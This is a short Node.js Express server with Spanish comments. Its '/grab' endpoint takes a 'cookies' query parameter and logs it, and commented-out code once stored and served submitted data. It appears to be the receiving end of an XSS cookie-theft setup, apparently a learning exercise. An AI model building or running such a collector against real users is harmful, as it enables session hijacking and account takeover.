const express = require('express')
const escapeHtml = require('escape-html');
const app = express()

let txt = ""

app.get('/', (req, res)=>{
    res.send("Hola Mundo");
});

app.get('/grab', (req, res) => {
    
    //Guardamos la data que el usuario nos manda en una variable global
    //const data = req.query.data
    //txt += escapeHtml(data) + ""
    //res.send(escapeHtml(data));
    
    //Recibir las cookies que  nos manda el usuario
    const cookies = req.query.cookies
    console.log("Cookies recibidas:", cookies);
    //Mostramos las cookies
    res.send(escapeHtml(cookies)); //No se puede mostrar en pantalla solo se ve en consola
    
    
})

app.get('/read', (req, res) =>{
    //Leemos el valor que nos envian a txt
    //res.send(escapeHtml(txt))
})

app.listen(3000, () => {
    console.log(`Escuchando en el puerto http://localhost:${3000}`)
})
